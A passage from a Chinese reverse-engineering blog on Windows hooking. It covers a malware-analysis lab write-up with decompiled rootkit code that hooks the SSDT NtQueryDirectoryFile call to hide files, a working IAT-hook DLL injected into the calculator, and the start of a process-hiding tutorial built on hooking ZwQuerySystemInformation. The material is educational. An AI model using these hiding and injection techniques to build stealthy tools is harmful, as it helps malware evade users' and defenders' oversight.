 lea     eax,[ebp+0Ch]\n\n如果在0x95197486处的卸载函数DriverUnload很长或很复杂，使用windbg较难分析它。多数情况下，一旦确定了函数的位置，可以使用ida进行分析。但windbg中的函数位置与ida中不一样，所以为了在ida中查看函数，还要进行手动计算。\n首先使用lm命令，计算函数从windbg加载文件开始处的偏移量，\n12345678910111213141516171819202122230: kd&gt; lmstart    end        module name83e0b000 84233000   nt         (pdb symbols)          C:\\ProgramData\\Dbg\\sym\\ntkrpamp.pdb\\5D110DC0022948A3B3FAF52F08E778402\\ntkrpamp.pdb950ca000 950dc000   BTHUSB     (deferred)             950dc000 95140000   bthport    (deferred)             95140000 95164000   rfcomm     (deferred)             95164000 95171000   BthEnum    (deferred)             95171000 9518c000   bthpan     (deferred)             9518c000 95197000   monitor    (deferred)             95197000 95197e80   Lab10_01   (no symbols)           Unloaded modules:905f3000 905fe000   monitor.sys8ac1c000 8ac80000   bthport.sys90400000 90412000   BTHUSB.sys8aca4000 8acb1000   BthEnum.sys8ac80000 8aca4000   rfcomm.sys8acb1000 8accc000   bthpan.sys9705b000 97073000   parport.sys89c2d000 89c3a000   crashdmp.sys8a019000 8a023000   dump_storport.sys89a00000 89a18000   dump_LSI_SAS.sys89def000 89e00000   dump_dumpfve.sys\n\n可以看到，文件被加载到0x95197000。从前面可知，卸载函数位于0x95197486处，从0x95197486减去0x95197000得到偏移量（0x486）。然后在ida中跳到卸载函数。例如，若ida中加载中基地址（imagebase）是0x100000，则在0x100000+0x486&#x3D;0x100486处找到卸载函数然后进行静态分析。另一种方法是，在ida中，通过edit—&gt;segment—&gt;rebase program来修改基地址，将地址0x100000修改为0x95197000。\n《恶意代码分析实战》——Lab10.2静态分析-Lab10-02.exe使用ida查看Lab10-02.exe主函数，可以看出该程序首先会获取编号为0x65（101）的资源，然后写入C:\\Windows\\System32\\Mlwx486.sys，并以此创建服务。这个文件包含了由操作系统加载的内核代码。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int __cdecl main(int argc, const char **argv, const char **envp)&#123;  HRSRC v3; // edi@1  HGLOBAL v4; // ebx@1  HANDLE v5; // esi@2  DWORD v6; // eax@3  SC_HANDLE v7; // eax@3  SC_HANDLE v9; // eax@5  void *v10; // esi@5  DWORD NumberOfBytesWritten; // [sp+Ch] [bp-4h]@3  v3 = FindResourceA(0, (LPCSTR)0x65, &quot;FILE&quot;);  v4 = LoadResource(0, v3);  if ( v3 )  &#123;    v5 = CreateFileA(&quot;C:\\\\Windows\\\\System32\\\\Mlwx486.sys&quot;, 0xC0000000, 0, 0, 2u, 0x80u, 0);    if ( v5 != (HANDLE)-1 )    &#123;      v6 = SizeofResource(0, v3);      WriteFile(v5, v4, v6, &amp;NumberOfBytesWritten, 0);      CloseHandle(v5);      v7 = OpenSCManagerA(0, 0, 0xF003Fu);      if ( !v7 )      &#123;        printf(&quot;Failed to open service manager.\\n&quot;);        return 0;      &#125;      v9 = CreateServiceA(             v7,             &quot;486 WS Driver&quot;,             &quot;486 WS Driver&quot;,             0xF01FFu,             1u,             3u,             1u,             &quot;C:\\\\Windows\\\\System32\\\\Mlwx486.sys&quot;,             0,             0,             0,             0,             0);      v10 = v9;      if ( !v9 )      &#123;        printf(&quot;Failed to create service.\\n&quot;);        return 0;      &#125;      if ( !StartServiceA(v9, 0, 0) )        printf(&quot;Failed to start service.\\n&quot;);      CloseServiceHandle(v10);    &#125;  &#125;  return 0;&#125;\n\n接下来应该查找程序创建的文件，以便分析并且确定内核代码做了什么。但是查找C:\\Windows\\System32\\Mlwx486.sys时，却没有出现，怀疑这是一个Rootkit。\n查找Rootkit为了进一步调查，要检查内核驱动是否被加载。使用cmd执行sc命令检查运行内核驱动程序的服务状态：\n1sc query &quot;486 WS Driver&quot;\n\n查询名为”486 WS Driver”的服务，它在Lab10-02.exe的CreateServiceA中被指定。可以看到该服务仍然在运行，这表明内核代码在内存中。奇怪的是驱动仍然在运行，但是它没有在硬盘上。使用windbg命令lm查询驱动是否被真正加载。\n看到了一个与Lab10-02.exe创建文件名（Mlwx486.sys）匹配的条目Mlwx486。\n现在确定文件名为Mlwx486.sys的驱动被载入内存，但是文件没有在硬盘上显示，这暗示它可能是一个Rootkit。\n接下来，检查SSDT的所有修改项       \n1234567891011120: kd&gt; dd dwo(KeServiceDescriptorTable) L100ReadVirtual: 83e76e3c not properly sign extended......83e76e4c  84094933 83f125cc 84107433 8410747c83e76e5c  84015dc8 84122cfc 84123f55 8400c55783e76e6c  8409efd5 840f9da5 8404a210 8401911f83e76e7c  83faeb85 840eb490 83fffacf 84042faf83e76e8c  84090200 fffef813 8408f60d 8400d5d183e76e9c  840a0a71 8400fc66 840a0851 84098fd883e76eac  84021e2f 840e5a51 840963b9 840a0ca383e76ebc  840792f2 84094362 84024a88 84018753......\n\n可以看到第五行的fffef813明显位于ntoskrnl模块的范围外，位于加载的Mlwx486.sys的驱动内。将虚拟机恢复到Rootkit安装之前的状态，查看存储在SSDT中的哪个函数被覆盖了。\n\n\n\n\n\n\n\n\n\n当检查SSDT 时，应观察其函数指针是否存在NT模块的地址范围内，如果Rootkit挂钩了其中某个函数，则这个函数指针可能不在NT模块的地址范围内。\n可以使用命令lm m nt查看SSDT列表，若发现不在地址范围内的函数指针，则首先使用lm命令查询模块列表，确认函数指针在哪个模块，定位了驱动程序，就可以查找挂钩代码并进行分析\n本例中被覆盖的是NtQueryDirectoryFile，它是一个提取文件和目录信息的通用函数，而FindFirstFile和FindNextFile都是调用它来遍历目录结构的。Windows资源管理器也会利用它来显示文件和目录\n分析挂钩函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475NTSTATUS __stdcall sub_10706(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123;  PVOID v2; // edi@1  PVOID *v3; // eax@1  signed int v4; // ecx@1  UNICODE_STRING SystemRoutineName; // [sp+8h] [bp-10h]@1  UNICODE_STRING DestinationString; // [sp+10h] [bp-8h]@1  RtlInitUnicodeString(&amp;DestinationString, L&quot;NtQueryDirectoryFile&quot;);  RtlInitUnicodeString(&amp;SystemRoutineName, L&quot;KeServiceDescriptorTable&quot;);  v2 = MmGetSystemRoutineAddress(&amp;DestinationString);  v3 = *(PVOID **)MmGetSystemRoutineAddress(&amp;SystemRoutineName);  v4 = 0;  do  &#123;    ++v3;    if ( *v3 == v2 )      break;    ++v4;  &#125;  while ( v4 &lt; 284 );  dword_1068C = (int)v2;  dword_10690 = (int)v3;  *v3 = sub_10486;  return 0;&#125;NTSTATUS __stdcall sub_10486(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG FileInformationLength, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan)&#123;  char *v11; // esi@1  NTSTATUS v12; // eax@1  char *v13; // edi@1  char v14; // bl@4  NTSTATUS RestartScana; // [sp+38h] [bp+30h]@1  v11 = (char *)FileInformation;  v12 = NtQueryDirectoryFile(          FileHandle,          Event,          ApcRoutine,          ApcContext,          IoStatusBlock,          FileInformation,          FileInformationLength,          FileInformationClass,          ReturnSingleEntry,          FileName,          RestartScan);  v13 = 0;  RestartScana = v12;  if ( FileInformationClass == FileBothDirectoryInformation &amp;&amp; v12 &gt;= 0 &amp;&amp; !ReturnSingleEntry )  &#123;    while ( 1 )    &#123;      v14 = 0;      if ( RtlCompareMemory(v11 + 0x5E, L&quot;Mlwx&quot;, 8u) == 8 )      &#123;        v14 = 1;        if ( v13 )        &#123;          if ( *(_DWORD *)v11 )            *(_DWORD *)v13 += *(_DWORD *)v11;          else            *(_DWORD *)v13 = 0;        &#125;      &#125;      if ( !*(_DWORD *)v11 )        break;      if ( !v14 )        v13 = v11;      v11 += *(_DWORD *)v11;    &#125;  &#125;  return RestartScana;&#125;\n\n对于NtQueryDirectoryFile函数，若FileInformationClass为FileBothDirectoryInformation（3），则执行函数后，FileInformation会被填充为_FILE_BOTH_DIR_INFORMATION结构体。\n123456789101112131415161700000000 _FILE_BOTH_DIR_INFORMATION struc ; (sizeof=0x60, align=0x8, copyof_14)00000000 NextEntryOffset dd ?00000004 FileIndex       dd ?00000008 CreationTime    LARGE_INTEGER ?00000010 LastAccessTime  LARGE_INTEGER ?00000018 LastWriteTime   LARGE_INTEGER ?00000020 ChangeTime      LARGE_INTEGER ?00000028 EndOfFile       LARGE_INTEGER ?00000030 AllocationSize  LARGE_INTEGER ?00000038 FileAttributes  dd ?0000003C FileNameLength  dd ?00000040 EaSize          dd ?00000044 ShortNameLength db ?00000045                 db ? ; undefined00000046 ShortName       dw 12 dup(?)0000005E FileName        dw ?00000060 _FILE_BOTH_DIR_INFORMATION ends\n\n挂钩函数为sub_10486，其功能是调用RtlCompareMemory比较文件名（FileInformation+0x5E）开头四字节是否是（”Mlwx”），若是，则从_FILE_BOTH_DIR_INFORMATION链表中删除，以隐藏该文件\n参考链接\nhttps://www.cnblogs.com/joneyyana/p/12585469.html\nhttps://blog.csdn.net/qq_38474570/article/details/103674271\nhttps://blog.csdn.net/qq_41988448/article/details/102994374\nhttps://cata1oc.github.io/2020/03/27/API%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%88%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E8%A1%A8%EF%BC%89/\nhttps://www.bilibili.com/video/BV1NJ411M7aE?p=41\nhttps://blog.csdn.net/zahngzhic/article/details/131755579\n\n","slug":"SSDT Hook","date":"2022-03-26T11:33:07.000Z","categories_index":"","tags_index":"hook技术,逆向工程核心原理,API hook,SSDT,系统调用","author_index":"0netry"},{"id":"0f25dc3ea7a3ffec9ce07cef8295e4e2","title":"IAT Hook","content":"IAT Hook前置知识通过注入DLL文件来钩取某个API，DLL文件注入目标进程后，修改IAT来更改进程中调用的特定API功能。\nAPI功能\nkernel32!CreateFile()：创建文件\n\nadvapi32!RegCreateKeyEx()：创建注册表新键\n\nws2_32!connect()：网络连接\n\n\nIAT钩取工作原理这种Hook技术是通过分析目标程序PE结构，替换目标API在IAT中的地址为钩子函数的地址来实现。\nIAT和PE文件结构要了解这种Hook技术，首先需要知道IAT和PE文件结构。\nPE文件是Windows下可执行文件和DLL等文件的一种规范。实际上，exe文件在磁盘中的映射就是PE格式，可以通过PE工具查看exe文件来进行研究。\n当程序被加载的时候，windows加载函数会定位所有的导入数据和代码，这样的实际做法就是将DLL文件映射到进程的地址空间中，实际上这个映射的过程就是通过PE文件的头部信息来实施的，因为PE文件头部中存储了所有需要导入的DLL的模块名称以及导入函数。\n实际上IAT存储了进程中所有的导入的DLL和其对应的导入函数的信息，要找到某个导入函数的地址，那么必须要定位到导入表。因为导入表的存储位置就在PE文件头中，所以了解PE文件是非常有必要的。\nPE文件的真正头部紧接Dos头，在Dos头的最后一个字段e_lfanew指向的是PE头的地址，在PE Header的结构IMAGE_NT_HEADER中，有一个结构IMAGE_OPTIONAL_HEADER，这个结构中有一个IMAGE_DATA_DIRECTORY（数据目录）类型的数组，其中第二个元素就是存储的导入表的相对虚拟地址和大小，通过这个可以定位到导入表的地址，从而找到对应的函数的地址。\n导入表的结构为IAMGE_IMPORT_DESCRIPTOR ，它的第一个参数OriginFirstThunk和最后一个参数FirstThunk分别指向的是同一种结构IMAGE_THUNK_DATA，但是因为这个结构体中是一个联合结构，所以根据这个DWORD类型的值的不同所表示的意义也不同。OriginFirstThunk指向的这个结构表示的是一个导入序号；而FirstThunk指向的这个结构表示的是函数的名字，这时DWORD的值表示的是一个RVA，并指向个IMAGE_IMPORT_BY_NAME结构。\n在装载PE文件的时候，装载器会遍历OriginFirstThunk指向的IMAGE_THUNK_DATA数组，找到每个IAMGE_THUNK_DATA结构中函数所对应的地址，然后加载器用函数真正的入口地址来代替FirstThunk指向的数组，这个地址数组我们称之为IAT（导入地址表）。\nIAT HOOK介绍了原理，下面就是最重要的东西了——IAT HOOK。\n那么我们的钩子函数从何而来呢？依然是两种方法可以获得，第一种是API函数；另一种是我们自己构造的函数，而我们构造的函数可以通过直接注入代码到目标进程或通过注入DLL而来导入我们的函数进入目标进程。\n实际上到这里我们的思路已经很清晰了，只要修改IAT中函数的入口点地址为我们构造的函数的地址，那么程序调用此API时实际上调用的就是我们自己构造的函数。既然要修改IAT中的内容，那么就必须要定位IAT的地址。\n上面的过程可以描述为:对于一个PE文件映像，从偏移位置0开始就是Dos Header,在Dos头中我们知道有一个指针e_lfanew指向真正的PE文件头，通过PE文件头可以得到数据目录，而数据目录的第二个元素就是存储的导入表的信息，通过导入表的信息我们可以定位到导入表，其结构为IMAGE_IMPORT_DESCRIPTOR，再通过遍历所有的IMAGE_IMPORT_DESCRIPTOR结构可以得到所有的DLL文件名，通过遍历每个结构的FirstThunk成员可以得到每个函数的地址，通过遍历每个结构的OriginalFirstThunk所指向的IMAGE_IMPORT_BY_NAME可以得到每个函数的导出函数名。\n基于Win10的计算器显示中文数字练习1.运行过程展示将calc.exe、InjectDll.exe、hookiat.dll复制到同一个目录下，运行calc.exe，然后打开Process Explorer查看计算器的PID，接着在命令窗口输入命令InjectDll.exe i PID hookiat.dll  ，即可将hookiat.dll注入到计算器中（可在Process Explorer查看到），接着输入数字时可以发现显示了中文\n![IAT Hook计算器显示中文数字结果](.&#x2F;IAT Hook计算器显示中文数字结果.png)\n2.代码流程分析源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127// include#include &quot;stdio.h&quot;#include &quot;wchar.h&quot;#include &quot;windows.h&quot;// typedeftypedef BOOL (WINAPI *PFSETWINDOWTEXTW)(HWND hWnd, LPWSTR lpString);// globalsFARPROC g_pOrgFunc = NULL;BOOL WINAPI MySetWindowTextW(HWND hWnd, LPWSTR lpString)&#123;    wchar_t* pNum = L&quot;零一二三四五六七八九&quot;;    wchar_t temp[2] = &#123;0,&#125;;    int i = 0, nLen = 0, nIndex = 0;    nLen = wcslen(lpString);    for(i = 0; i &lt; nLen; i++)    &#123;        //将阿拉伯数字转换为中文数字        //lpString是 wide-character (宽字符，2 byte)字符串        if( L&#x27;0&#x27; &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L&#x27;9&#x27; )        &#123;            temp[0] = lpString[i];            nIndex = _wtoi(temp);            lpString[i] = pNum[nIndex];        &#125;    &#125;    // 调用user32!SetWindowTextW() API    // (修改lpString缓冲区中的内容)    return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);&#125;BOOL hook_iat(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)&#123;\tHMODULE hMod;\tLPCSTR szLibName;\tPIMAGE_IMPORT_DESCRIPTOR pImportDesc; \tPIMAGE_THUNK_DATA pThunk;\tDWORD dwOldProtect, dwRVA;\tPBYTE pAddr;    // hMod, pAddr = ImageBase of calc.exe    //             = VA to MZ signature (IMAGE_DOS_HEADER)\thMod = GetModuleHandle(NULL);\tpAddr = (PBYTE)hMod;    // pAddr = VA to PE signature (IMAGE_NT_HEADERS)\tpAddr += *((DWORD*)&amp;pAddr[0x3C]);    // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table\tdwRVA = *((DWORD*)&amp;pAddr[0x80]);    // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table\tpImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);\tfor( ; pImportDesc-&gt;Name; pImportDesc++ )\t&#123;        // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name\t\tszLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name);\t\tif( !_stricmp(szLibName, szDllName) )\t\t&#123;            // pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk            //        = VA to IAT(Import Address Table)\t\t\tpThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod +                                          pImportDesc-&gt;FirstThunk);            // pThunk-&gt;u1.Function = VA to API\t\t\tfor( ; pThunk-&gt;u1.Function; pThunk++ )\t\t\t&#123;\t\t\t\tif( pThunk-&gt;u1.Function == (DWORD)pfnOrg )\t\t\t\t&#123;                    // 更改内存属性为E/R/W\t\t\t\t\tVirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function,                                    4,                                    PAGE_EXECUTE_READWRITE,                                    &amp;dwOldProtect);                    // 修改IAT值（钩取）                    pThunk-&gt;u1.Function = (DWORD)pfnNew;\t\t\t\t\t                    // 恢复内存属性                    VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function,                                    4,                                    dwOldProtect,                                    &amp;dwOldProtect);\t\t\t\t\t\t\t\t\t\t\treturn TRUE;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;\treturn FALSE;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;\tswitch( fdwReason )\t&#123;\t\tcase DLL_PROCESS_ATTACH :             // 保存原始API地址           \tg_pOrgFunc = GetProcAddress(GetModuleHandle(L&quot;user32.dll&quot;),                                         &quot;SetWindowTextW&quot;);            // # hook            // 用hookiat!MySetWindowText()钩取user32!SetWindowTextW()\t\t\thook_iat(&quot;user32.dll&quot;, g_pOrgFunc, (PROC)MySetWindowTextW);\t\t\tbreak;\t\tcase DLL_PROCESS_DETACH :            // # unhook            // 将calc.exe的IAT恢复原值            hook_iat(&quot;user32.dll&quot;, (PROC)MySetWindowTextW, g_pOrgFunc);\t\t\tbreak;\t&#125;\treturn TRUE;&#125;\n\nDllMain()1234567891011121314151617181920212223BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;\tswitch( fdwReason )\t&#123;\t\tcase DLL_PROCESS_ATTACH :             // 保存原始API地址           \tg_pOrgFunc = GetProcAddress(GetModuleHandle(L&quot;user32.dll&quot;),                                         &quot;SetWindowTextW&quot;);            // # hook            // 用hookiat!MySetWindowText()钩取user32!SetWindowTextW()\t\t\thook_iat(&quot;user32.dll&quot;, g_pOrgFunc, (PROC)MySetWindowTextW);\t\t\tbreak;\t\tcase DLL_PROCESS_DETACH :            // # unhook            // 将calc.exe的IAT恢复原值            hook_iat(&quot;user32.dll&quot;, (PROC)MySetWindowTextW, g_pOrgFunc);\t\t\tbreak;\t&#125;\treturn TRUE;&#125;\n\n保存SetWindowTextW()地址\n在DLL_PROCESS_ATTACH事件中先获取user32.SetWindowTextW()的地址，然后将其保存到全局变量g_pOrgFunc中后面脱钩时会用到这个地址\nIAT钩取\n1hook_iat(&quot;user32.dll&quot;, g_pOrgFunc, (PROC)MySetWindowTextW);\n\n调用hook_iat函数钩取IAT（即将user32!SetWindowTextW()的地址更改为hookiat!MySetWindowText()的地址）。上面语句是发生DLL加载事件（DLL_PROCESS_ATTACH）时执行的所有操作。\nIAT脱钩\n1hook_iat(&quot;user32.dll&quot;, (PROC)MySetWindowTextW, g_pOrgFunc);\n\n卸载DLL时会触发DLL_PROCESS_DETACH事件，发生该事件时，将进行IAT脱钩（即将用hookiat!MySetWindowText()的地址更改为user32!SetWindowTextW()的地址）\nMySetWindowTextW()——钩取函数（钩子函数）1234567891011121314151617181920212223BOOL WINAPI MySetWindowTextW(HWND hWnd, LPWSTR lpString)&#123;    wchar_t* pNum = L&quot;零一二三四五六七八九&quot;;    wchar_t temp[2] = &#123;0,&#125;;    int i = 0, nLen = 0, nIndex = 0;    nLen = wcslen(lpString);    for(i = 0; i &lt; nLen; i++)    &#123;        //将阿拉伯数字转换为中文数字        //lpString是 wide-character (宽字符，2 byte)字符串        if( L&#x27;0&#x27; &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L&#x27;9&#x27; )        &#123;            temp[0] = lpString[i];            nIndex = _wtoi(temp);            lpString[i] = pNum[nIndex];        &#125;    &#125;    // 调用user32!SetWindowTextW() API    // (修改lpString缓冲区中的内容)    return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);&#125;\n\n计算器进程的IAT被钩取后，每当代码中调用user32!SetWindowTextW()函数时，都会先调用hookiat!MySetWindowText()函数。\n接下来分析hookiat!MySetWindowText()函数的重要代码。hookiat!MySetWindowText()函数的lpString参数是一块缓冲区，该缓冲区用来存放要输出显示的字符串，所以操作lpString参数即可在计算器中显示用户指定的字符串。for循环结束，代码return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);最后再调用函数指针g_pOrgFunc，它指向user32!SetWindowTextW()函数的起始地址（该地址在DllMain中已经获取并保存下来），也就是说，调用原来的SetWindowTextW()函数，将中文数字显示在计算器的显示框中。、\nhook_iat()该函数是具体执行IAT钩取的函数。\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162BOOL hook_iat(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)&#123;\tHMODULE hMod;\tLPCSTR szLibName;\tPIMAGE_IMPORT_DESCRIPTOR pImportDesc; \tPIMAGE_THUNK_DATA pThunk;\tDWORD dwOldProtect, dwRVA;\tPBYTE pAddr;    // hMod, pAddr = ImageBase of calc.exe    //             = VA to MZ signature (IMAGE_DOS_HEADER)\thMod = GetModuleHandle(NULL);\tpAddr = (PBYTE)hMod;    // pAddr = VA to PE signature (IMAGE_NT_HEADERS)\tpAddr += *((DWORD*)&amp;pAddr[0x3C]);    // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table\tdwRVA = *((DWORD*)&amp;pAddr[0x80]);    // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table\tpImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);\tfor( ; pImportDesc-&gt;Name; pImportDesc++ )\t&#123;        // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name\t\tszLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name);\t\tif( !_stricmp(szLibName, szDllName) )\t\t&#123;            // pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk            //        = VA to IAT(Import Address Table)\t\t\tpThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod +                                          pImportDesc-&gt;FirstThunk);            // pThunk-&gt;u1.Function = VA to API\t\t\tfor( ; pThunk-&gt;u1.Function; pThunk++ )\t\t\t&#123;\t\t\t\tif( pThunk-&gt;u1.Function == (DWORD)pfnOrg )\t\t\t\t&#123;                    // 更改内存属性为E/R/W\t\t\t\t\tVirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function,                                    4,                                    PAGE_EXECUTE_READWRITE,                                    &amp;dwOldProtect);                    // 修改IAT值（钩取）                    pThunk-&gt;u1.Function = (DWORD)pfnNew;\t\t\t\t\t                    // 恢复内存属性                    VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function,                                    4,                                    dwOldProtect,                                    &amp;dwOldProtect);\t\t\t\t\t\t\t\t\t\t\treturn TRUE;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;\treturn FALSE;&#125;\n\n12345678910111213141516171819202122232425262728293031323334353637int __cdecl sub_10001090(int a1, DWORD a2)&#123;  HMODULE ModuleHandleW; // edi  int import_dll_name_rva; // ebx  IMAGE_THUNK_DATA *first_trunk; // esi  DWORD flOldProtect; // [esp+10h] [ebp-4h] BYREF  ModuleHandleW = GetModuleHandleW(0);  import_dll_name_rva = (int)ModuleHandleW                      + *(_DWORD *)((char *)ModuleHandleW + *((_DWORD *)ModuleHandleW + 0xF) + 0x80)                      + 0xC;  if ( !*(_DWORD *)import_dll_name_rva )    return 0;  while ( 1 )  &#123;    if ( !_stricmp((const char *)ModuleHandleW + *(_DWORD *)import_dll_name_rva, &quot;user32.dll&quot;) )    &#123;      first_trunk = (IMAGE_THUNK_DATA *)((char *)ModuleHandleW + *(_DWORD *)(import_dll_name_rva + 4));      if ( first_trunk-&gt;Function )        break;    &#125;LABEL_6:    import_dll_name_rva += 0x14;    if ( !*(_DWORD *)import_dll_name_rva )      return 0;  &#125;  while ( first_trunk-&gt;Function != a1 )  &#123;    ++first_trunk;    if ( !first_trunk-&gt;Function )      goto LABEL_6;  &#125;  VirtualProtect(first_trunk, 4u, 0x40u, &amp;flOldProtect);  first_trunk-&gt;Function = a2;  VirtualProtect(first_trunk, 4u, flOldProtect, &amp;flOldProtect);  return 1;&#125;\n\n读取PE文件头信息并查找IAT位置\n123456789101112131415//获取当前的ImagBase(基址)// hMod, pAddr = ImageBase of calc.exe//             = VA to MZ signature (IMAGE_DOS_HEADER)hMod = GetModuleHandle(NULL);//获取DOS头pAddr = (PBYTE)hMod;//获取NT头// pAddr = VA to PE signature (IMAGE_NT_HEADERS)pAddr += *((DWORD*)&amp;pAddr[0x3C]);//获取IMAGE_IMPORT_DESCRIPTOR的RVA// dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR TabledwRVA = *((DWORD*)&amp;pAddr[0x80]);//获取IMAGE_IMPORT_DESCRIPTOR的VA// pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR TablepImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);\n\n调试被注入的DLL文件1.首先运行calc.exe，然后打开x32dbg进行附加\n\n2.接着菜单栏选择选项-&gt;选项-&gt;事件，勾选User DLL Load然后保存\n这样，注入DLL文件时，控制权就会转给调试器\n![勾选User DLL Load](.&#x2F;勾选User DLL Load.png)\n3.然后在命令行首先输入命令tasklist | findstr &quot;calc.exe&quot;获取计算器的PID，然后输入命令InjectDll.exe i 计算器PID hookiat.dll将hookiat.dll注入计算器中\n\n4.可以看到，calc.exe进程中发生DLL加载事件时，相关事件就会被通知到调试器，设置好选项后，调试器就会在hookiat.dll的EP处暂停下来\n\n5.接下来取消勾选User DLL Load，然后查找DllMain代码（使用IDA查看），并在其起始位置下断点，然后运行，可以看到调试器在断点处暂停，接下来就可以调试注入的DLL了\n\n\n参考链接https://blog.csdn.net/junbopengpeng/article/details/28142669\n","slug":"IAT Hook","date":"2022-03-25T02:23:09.000Z","categories_index":"","tags_index":"hook技术,逆向工程核心原理,API hook","author_index":"0netry"},{"id":"ef0903e74e5233a2be57edee3f37a5dc","title":"inline Hook","content":"原理程序在编译链接后成了二进制代码，我们可以找到需要Hook的函数的地址，然后把这个函数在内存中的二进制代码改为一个JMP指令，令其跳转到执行我们自己构造的函数。\n貌似有点难以理解，来看看详细的原理解释：\n函数一般都存在于DLL中，当DLL中某个函数被调用后，其所在的DLL将会被映射到进程地址空间中。我们可以通过DLL这个模块找到我们需要Hook的函数的地址。然后在内存中改变其地址，使跳转到我们制定的位置。比如现在需要Hook 函数CreateFile，这个函数存在于Kernel32.DLL文件中。首先我们必须要知道这个函数在进程中的地址，然后修改这个函数的首地址为JMP MyProc指令。而MyProc函数可以是API函数，也可以是我们自己构造的函数，如果是我们自己构造的函数，那么我们有两种方法把我们的函数注入进目标进程，那就是通过远程线程注入的两种方法。\nIAT钩取通过操作进程的特定IAT值来实现API钩，而inline hook则将API代码的前5个字节修改为JMP XXXXXXXX指令来钩取API。调用执行被钩取的API时，（修改后的）JMP指令就会被执行，转而控制hooking函数。\n\n\n\n\n\n\n\n\n\n顾名思义，API代码修改就是指直接修改映射到目标进程内存空间的系统DLL的代码。\n进程隐藏进程隐藏的相关内容信息已经得到大量公开，其中用户模式下最常用的就是ntdll.ZwQuerySystemInformation() API钩取技术。\n进程隐藏工作原理为了隐藏某个特定进程，要潜入其他所有进程内存，钩取相关API。也就是说，实现进程隐藏的关键不是进程自身，而是其他进程。\n相关API由于进程是内核对象，所以（用户模式下的程序）只要通过相关API就能检测到它们。用户模式下检测进程的相关API通常分为如下两类：\n1.CreateToolhelp32Snapshot()&amp;EnumProcesses()\n123456789101112HANDLE WINAPI CreateToolhelp32Snapshot(    DWORD dwFlags,    DWORD th32ProcessID);                                                           //tlhelp32.h                                                           BOOL WINAPI EnumProcesses(    _Out_writes_bytes_(cb) DWORD* lpidProcess,    _In_ DWORD cb,    _Out_ LPDWORD lpcbNeeded);                                                                                                                  //psapi.h\n\n上面两个API均在其内部调用了ntdll.ZwQuerySystemInformation() API\n2.ZwQuerySystemInformation() \n123456NTSTATUS WINAPI ZwQuerySystemInformation(  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,  _Inout_   PVOID                    SystemInformation,  _In_      ULONG                    SystemInformationLength,  _Out_opt_ PULONG                   ReturnLength);\n\n借助ZwQuerySystemInformation() API可以获取运行中的所有进程信息（结构体），形成一个链表。操作该链表（从链表中删除）即可隐藏相关进程。所以在用户模式下不需要分别钩取CreateToolhelp32Snapshot()与EnumProcesses()，只需要钩取ZwQuerySystemInformation()  API就可隐藏指定进程。注意，我们要钩取的目标进程不是要隐藏的进程，而是其他进程。假如要隐藏的进程为test.exe，如果钩取正在运行中的ProcExp.exe（进程查看器或taskmgr.exe任务管理器）进程的ZwQuerySystemInformation() API，那么ProcExp.exe（或taskmgr.exe）就无法查找到test.exe。\n基于Win10的隐藏notepad.exe练习HideProc.exe负责将stealth.dll文件注入所有运行中的进程。stealth.dll负责钩取（注入stealth.dll文件的）进程的ntdll.ZwQuerySystemInformation() API\n1.首先运行notepad.exe（要隐藏的进程）、procexp.exe（钩取对象1）、taskmgr.exe（钩取对象2）\nHideProc.cpp源码分析HideProc.exe负责向运行中的所有进程注入&#x2F;卸载指定的DLL文件。\nWindows 